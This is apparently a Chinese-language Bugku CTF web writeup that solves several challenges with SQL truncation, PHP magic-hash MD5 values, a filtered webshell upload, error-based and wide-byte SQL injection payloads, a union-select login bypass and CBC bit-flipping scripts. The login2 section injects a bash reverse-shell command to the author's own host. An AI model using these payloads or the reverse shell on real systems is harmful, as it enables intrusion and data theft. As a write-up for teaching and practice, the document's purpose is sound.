---
layout: post
title: "Bugku writeup4"
date: 2018-03-21 22：00
categories: jekyll update
---

# web
### login1(SKCTF)
&emsp;&emsp;题目描述：
<div align="center">
    <img src="/images/posts/bugku/67.png" >  
</div>
&emsp;&emsp;这道题用的是`sql约束攻击`，利用的是数据库字段定义时产生的漏洞。如：
```shell
mysql> CREATE TABLE users (
    ->   username varchar(25),
    ->   password varchar(25)
    -> );
```
&emsp;&emsp;这里的`username`只允许25个字符，超过后就舍去25字符以后的，然后在`mysql`中，`admin`跟`admin       [很多空格]`在查询的时候是一样的。因为`admin`用户已经存在，但我们不知道他的密码，所以我们自己注册一个`admin`然后替换掉密码。所以我们可以注册一个`admin[很多个空格]1`的用户名，只要总字符数超过25，然后密码设成你的。注册成功后使用`admin`加你的`密码`去登陆即可得到flag。

### md5 collision(NUPT_CTF)
&emsp;&emsp;这道题是MD5碰撞，PHP在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法，然后`0 == 字符串`是成立的，从而绕过了MD5检查，这里记录一些MD5值：
```
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
```

### 文件包含2
&emsp;&emsp;打开题目，在源代码中发现了`upload.php`
<div align="center">
    <img src="/images/posts/bugku/68.png" >  
</div>
&emsp;&emsp;访问后发现是文件上传，但是只支持图片文件，不够这里没关系，不用考虑怎么绕过，因为文件包含的时候会使用`php`解析：
<div align="center">
    <img src="/images/posts/bugku/69.png" >  
</div>
&emsp;&emsp;上传一句话
<div align="center">
    <img src="/images/posts/bugku/70.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/71.png" >  
</div>
&emsp;&emsp;但是访问后发现存在过滤，`<?php`被替换成`_`。如下图：
<div align="center">
    <img src="/images/posts/bugku/72.png" >  
</div>
&emsp;&emsp;但是我们可以使用`<script language=php> </script>`标签绕过这个验证，我们再上传一次：
<div align="center">
    <img src="/images/posts/bugku/73.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/74.png" >  
</div>
&emsp;&emsp;可以看到，后台已经成功的解析了我们的`php代码`。接着使用菜刀连接。
<div align="center">
    <img src="/images/posts/bugku/75.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/76.png" >  
</div>
&emsp;&emsp;最终我们能拿到flag：`SKCTF{uP104D_1nclud3_426fh8_is_Fun}`。

### flag.php
&emsp;&emsp;题目：
<div align="center">
    <img src="/images/posts/bugku/77.png" >  
</div>
&emsp;&emsp;打开页面后发现提交表单没有反应，然后想起题目提示，所以尝试一下`get`一个请求。然后可以找到源码：
<div align="center">
    <img src="/images/posts/bugku/78.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/79.png" >  
</div>
&emsp;&emsp;这里有些诱惑性的东西，它故意在最后放出了`$key`的值，然而当你拿着`$KEY='ISecer:www.isecer.com';`去序列化后提交会发现是不对的。
<div align="center">
    <img src="/images/posts/bugku/80.png" >  
</div>
&emsp;&emsp;其实这道题用得知识跟数字与字符串比较的绕过方式有点相似，首先`$KEY`的值是没有定义的，但是我们可以构造`s:0:"";`字符串，他反序列化的结果就是一个空的字符串，然后绕过他的比较。
<div align="center">
    <img src="/images/posts/bugku/82.png" height="50%" />  
</div>
<div align="center">
    <img src="/images/posts/bugku/81.png" >  
</div>
&emsp;&emsp;此时flag就出来了。

### sql注入2
&emsp;&emsp;题目描述：
<div align="center">
    <img src="/images/posts/bugku/83.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/84.png" >  
</div>
&emsp;&emsp;这道题尝试了很多注入但都没有成功，后来经过看网上的writeup，才发现是`.DS_Store`泄露，然后网上找了个<a href="https://github.com/lijiejie/ds_store_exp">exp</a>，运行后就能得到flag文件。
<div align="center">
    <img src="/images/posts/bugku/85.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/86.png" >  
</div>
&emsp;&emsp;flag就是：`flag{sql_iNJEct_comMon3600!}`。

### 孙xx的博客
&emsp;&emsp;题目描述：
<div align="center">
    <img src="/images/posts/bugku/87.png" >  
</div>
&emsp;&emsp;这里提示信息搜集，所以我们扫一扫目录：
<div align="center">
    <img src="/images/posts/bugku/88.png" >  
</div>
&emsp;&emsp;这里扫出了`phpmyadmin`的目录，然后再去网站上看看，然后就能发现数据库的用户名和密码。
<div align="center">
    <img src="/images/posts/bugku/89.png" >  
</div>
&emsp;&emsp;我们拿去登陆一下，就能发现flag。
<div align="center">
    <img src="/images/posts/bugku/90.png" >  
</div>

### 报错注入
&emsp;&emsp;题目描述：
<div align="center">
    <img src="/images/posts/bugku/91.png" >  
</div>
&emsp;&emsp;可以看到这里过滤了很多字符，包括`空格`，但由于`mysql`的特性，我们可以使用回车换行符还替代即`%0a`或`%0d`。

&emsp;&emsp;因为要进行报错注入，所以我们可以使用`extractvalue()`或者`updatexml()`进行报错，尝试一条报错语句：
```
?id=1%0aand%0aextractvalue(1,concat(0x7e,(select%0a@@version),0x7e))
?id=1%0aand%0aupdatexml(1,concat(0x7e,(select%0a@@version),0x7e),1)
```
<div align="center">
    <img src="/images/posts/bugku/92.png" >  
</div>
&emsp;&emsp;可以看到已经成功报错，这里把`%0a`换成`%0d`也是可以的。要读取文件，mysql提供了`load_file()`函数，并且需要对文件名进行`16进制`编码。又因为`extractvalue()`有长度限制,最长为`32位`，所以我们需要使用`substr()`对`hex()`过的文件内容进行分割，我们一次取30个就好。这里注意的是如果不对文件内容进行`16进制`编码就会出现无法读取的情况。
```
?id=1%0aand%0a(extractvalue(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),1,30))),0x7e)
```
&emsp;&emsp;最终我们能拿到一串16进制的字符，然后解密就可以得到flag：
<div align="center">
    <img src="/images/posts/bugku/93.png" >  
</div>
&emsp;&emsp;但这里最坑的就是双引号是中文的`”`，所以直接复制题目给的flag形式，然后把双引号里的值粘贴进去就行了。

### login3(SKCTF)
&emsp;&emsp;打开题目，发现过滤了很多字符，包括`空格 , = and`，所以这给我们注入带来极大的不便，但是`or select >`没有被过滤，我们先找到闭合字符。而且我们注意到，页面使用的是`en`编码，所以可以考虑`宽字节`注入。
<div align="center">
    <img src="/images/posts/bugku/94.png" >  
</div>
&emsp;&emsp;然后我们构造了验证poc：`username=admin%df%27or'1'>'1&password=admin`跟`username=admin%df%27or'2'>'1&password=admin`。
<div align="center">
    <img src="/images/posts/bugku/95.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/96.png" >  
</div>
&emsp;&emsp;可以看到当`or`返回真时它会检查`password`是否正确，而当`or`返回假时会报`没有此用户`的错误，所以，我们可以接着构造我们的payload。下面是我的payload：
```
username=admin%df%27or(select(password))>'0&password=admin
```
&emsp;&emsp;我们只需要不断刷新`>'`后面的字符就能把密码给注入出来，这里值得注意的是最后一个值的确定，可以看到当最后一个字符为`/`时页面返回了真，而为`0`时则返回了假。
<div align="center">
    <img src="/images/posts/bugku/97.png" >  
</div>
<div align="center">
    <img src="/images/posts/bugku/98.png" >  
</div>
&emsp;&emsp;因为我们使用的是`>`来进行判断的，所以最后的一个值一定会比真实值`小`，也就是说我们最后一位应该取`0`才是正确的。所以最终md5值：`51b7a76d51e70b419f60d3473fb6f900`。解密出来就是：`skctf123456`。然后我们登陆一下就能获得flag。
<div align="center">
    <img src="/images/posts/bugku/99.png" >  
</div>
&emsp;&emsp;ps：本来这里是打算写脚本跑的，但因为判断条件在脚本里无法使用，在postman中也不能作为判别的依据，所以，这个方法只能在`burpsuite`跟`zap`上使用。
<div align="center">
    <img src="/images/posts/bugku/100.png" height="50%" />  
</div>

### Trim的日记本
&emsp;&emsp;打开页面后如下：
<div align="center">
    <img src="/images/posts/bugku/101.png" height="80%" />  
</div>
&emsp;&emsp;然后随手注册了以一个账号，但发现不知道`id`无法登陆，所以就拿出了目录扫描器看看有什么发现。
<div align="center">
    <img src="/images/posts/bugku/102.png" />  
</div>
&emsp;&emsp;然后这里还真的有发现，我们访问一下`show.php`。
<div align="center">
    <img src="/images/posts/bugku/103.png" />  
</div>
&emsp;&emsp;可以发现一个flag，拿去提交还真是真的flag。所以这道题就so easy了。。。

### login2(SKCTF)
&emsp;&emsp;这道题就是学习姿势了，自己做的时候没有找到思路，然后看了writeup才做出来。

&emsp;&emsp;对请求抓包，然后可以发现`tip`，解密出来是几行代码。
<div align="center">
    <img src="/images/posts/bugku/104.png" />  
</div>
```php
$sql="SELECT username,password FROM admin WHERE username='".$username."'";
if (!empty($row) && $row['password']===md5($password)){
}

```
&emsp;&emsp;这里可以看到它是分离式的验证，首先查询`username`的用户，然后拿出`password`再进行比较，一开始想着是注入出`admin`的密码，但发现可能没有这个用户，而且也找不到注入的`poc`。后来参考网上的writeup才知道正确的打开方式。payload：
```
username=' union select md5(1),md5(1)#&password=1
```
&emsp;&emsp;执行这条语句时由于前面的`username`为空，所以没有数据返回，但后面的`union select md5(1),md5(1)`则会返回两个MD5(1)的值，然后`password`我们也置为`1`，从而绕过`if`语句的判断。

&emsp;&emsp;接下来可以进入命令执行的页面。
<div align="center">
    <img src="/images/posts/bugku/105.png" />  
</div>
&emsp;&emsp;然后我们反弹回一个shell来方便我们操作。我们先在本地监听一下，这里使用nc。
```bash
nc -lvv 8888
```
&emsp;&emsp;然后执行反弹shell的命令。
```bash
|bash -i >& /dev/tcp/你的公网ip/8888 0>&1
```
&emsp;&emsp;最后就能在服务器上收到shell，然后查询flag。
<div align="center">
    <img src="/images/posts/bugku/106.png" height="70%" />  
</div>
&emsp;&emsp;所以flag：`SKCTF{Uni0n_@nd_c0mM4nD_exEc}`。

### login4（CBC字节翻转攻击）
&emsp;&emsp;这道题就纯属学习姿势了，首先是进行敏感目录扫描，然后发现`.index.php.swp`源码泄露。
<div align="center">
    <img src="/images/posts/bugku/107.png" />  
</div>
```php
<?php
define("SECRET_KEY", file_get_contents('/root/key'));
define("METHOD", "aes-128-cbc");
session_start();

function get_random_iv(){
    $random_iv='';
    for($i=0;$i<16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}

function login($info){
    $iv = get_random_iv();
    $plain = serialize($info);
    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    $_SESSION['username'] = $info['username'];
    setcookie("iv", base64_encode($iv));
    setcookie("cipher", base64_encode($cipher));
}

function check_login(){
    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){
        $cipher = base64_decode($_COOKIE['cipher']);
        $iv = base64_decode($_COOKIE["iv"]);
        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
            $info = unserialize($plain) or die("<p>base64_decode('".base64_encode($plain)."') can't unserialize</p>");
            $_SESSION['username'] = $info['username'];
        }else{
            die("ERROR!");
        }
    }
}

function show_homepage(){
    if ($_SESSION["username"]==='admin'){
        echo '<p>Hello admin</p>';
        echo '<p>Flag is $flag</p>';
    }else{
        echo '<p>hello '.$_SESSION['username'].'</p>';
        echo '<p>Only admin can see flag</p>';
    }
    echo '<p><a href="loginout.php">Log out</a></p>';
}

if(isset($_POST['username']) && isset($_POST['password'])){
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    if($username === 'admin'){
        exit('<p>admin are not allowed to login</p>');
    }else{
        $info = array('username'=>$username,'password'=>$password);
        login($info);
        show_homepage();
    }
}else{
    if(isset($_SESSION["username"])){
        check_login();
        show_homepage();
    }else{
        echo '<body class="login-body">
                <div id="wrapper">
                    <div class="user-icon"></div>
                    <div class="pass-icon"></div>
                    <form name="login-form" class="login-form" action="" method="post">
                        <div class="header">
                        <h1>Login Form</h1>
                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>
                        </div>
                        <div class="content">
                        <input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" />
                        <input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" />
                        </div>
                        <div class="footer">
                        <input type="submit" name="submit" value="Login" class="button" />
                        </div>
                    </form>
                </div>
            </body>';
    }
}
?>
```
&emsp;&emsp;因为`admin`用户被禁止了登陆，但是可以利用反序列化漏洞重置`$_SESSION['username']`为`admin`，然后拿到flag。

&emsp;&emsp;首先介绍一下`CBC字节翻转攻击`，如果我们要想把第二行（段）中的`2`变成`n`，我们只需要修改第一行（段）的`r`。
```
原文：
a:2:{s:8:"username";s:5:"admi2";s:8:"password";s:5:"skctf";}
按16个字符分割：
a:2:{s:8:"userna
me";s:5:"admi2";
s:8:"password";s
:5:"skctf";}
```
<div align="center">
    <img src="/images/posts/bugku/108.png" />  
</div>
&emsp;&emsp;修改方式就是：
```python
bs_de = 'a:2:{s:8:"username";s:5:"admi2";s:8:"password";s:5:"skctf";}'
bs_de=bs_de[0:13]+chr(ord(bs_de[13]) ^ ord('2') ^ ord('n'))+bs_de[14:]
```
&emsp;&emsp;我们把`cookie`中的`cipher`拿出来修改一下。
```python
# -*- coding:utf-8 -*-

import base64

bs = 'e8SnC9p3aEmJciIN8NWYM1PcA/A7jSwsiTglqdBMLRLf/8LOHKmhOoHSOBbJB1xEnE6S6DpfgkD8NWlJETxDZQ=='
bs_de = base64.b64decode(bs)
ch = chr(ord(bs_de[13]) ^ ord('2') ^ ord('n'))

bs_de=bs_de[0:13]+ch+bs_de[14::]

print(base64.b64encode(bs_de))
```
&emsp;&emsp;然后把得到的结果替换掉`cipher`，访问后可以发现反序列化出错了。
<div align="center">
    <img src="/images/posts/bugku/109.png" />  
</div>
&emsp;&emsp;这是因为在修改`第二段明文`的时候我们把`第一段的密文`破环掉了，造成后台无法解密出原来的数据。如下面这种情况。
<div align="center">
    <img src="/images/posts/bugku/110.png" />  
</div>
&emsp;&emsp;当将`6`修改成`7`的时候，造成了第一段密文解密出来的结果变成了乱码，所以我们还需要还原`第一段的密文`，所以我们要对`iv`这个初始向量进行修改。
<div align="center">
    <img src="/images/posts/bugku/111.png" />  
</div>
&emsp;&emsp;修改的方法还是跟上面一样的套路，只不过这里的`cipher`要变成上面提示`反序列化`错误的那个密文。因为这个反序列化错误的字符是`第一次翻转后的明文`。
<div align="center">
    <img src="/images/posts/bugku/112.png" />  
</div>
&emsp;&emsp;所以，我们修改的代码如下：
```python
import base64
mingwen_de='xvFs8hcryE3UwXuTa5b+7W1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjg6IlBhc3N3b3JkIjt9'
mingwen = base64.b64decode(mingwen_de)

iv = 'wJdHFG15Qc2hs1bkgMHd4w=='
iv_de = base64.b64decode(iv)
new = 'a:2:{s:8:"userna'
for i in range(16):
    iv_de = iv_de[:i] + chr(ord(iv_de[i]) ^ ord(mingwen[i]) ^ ord(new[i])) + iv_de[i+1:]

print(base64.b64encode(iv_de))
```
&emsp;&emsp;将得到的结果替换到`iv`上，然后刷新页面，就能看到flag了。
<div align="center">
    <img src="/images/posts/bugku/113.png" />  
</div>
